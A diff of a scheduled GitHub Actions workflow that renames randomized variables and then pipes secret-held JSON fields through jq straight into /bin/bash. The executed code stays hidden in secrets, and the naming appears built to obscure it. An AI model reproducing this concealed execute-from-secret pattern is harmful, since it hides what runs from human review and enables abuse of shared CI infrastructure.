@@ -1,10 +1,8 @@
 name: caohong19870101
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
-
+    - cron: '49 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: caohong19870101
         env:
-          bxnnp23: ${{ secrets.bxnnp23 }}
+          hxagv8347: ${{ secrets.hxagv8347 }}
         run: |
-          echo $bxnnp23 | jq -r .h465 | /bin/bash
-          echo $udi62 | jq -r .a26 | /bin/bash
-          echo $wgrrp5111 | jq -r .rdzy0 | /bin/bash
-          echo $jbfdj13892 | jq -r .glyo72965 | /bin/bash
-          echo $seh39992 | jq -r .fa48783 | /bin/bash
-          echo $ioka6829 | jq -r .lk5389 | /bin/bash
-          echo $ebjea4 | jq -r .zq976 | /bin/bash
-          echo $rr721 | jq -r .kos554 | /bin/bash
-          echo $gamf54 | jq -r .vxstm1 | /bin/bash
-          echo $rqpz8237 | jq -r .jh09 | /bin/bash
+          echo $hxagv8347 | jq -r .nuo05172 | /bin/bash
+          echo $vciwi47938 | jq -r .yygd563 | /bin/bash
+          echo $vjzkm2 | jq -r .d234 | /bin/bash
+          echo $mnnry43 | jq -r .wndkh0 | /bin/bash
+          echo $uxh2330 | jq -r .o4 | /bin/bash
+          echo $dlf44 | jq -r .l6439 | /bin/bash
+          echo $uk333 | jq -r .qylr7 | /bin/bash
+          echo $t88615 | jq -r .jt493 | /bin/bash
 
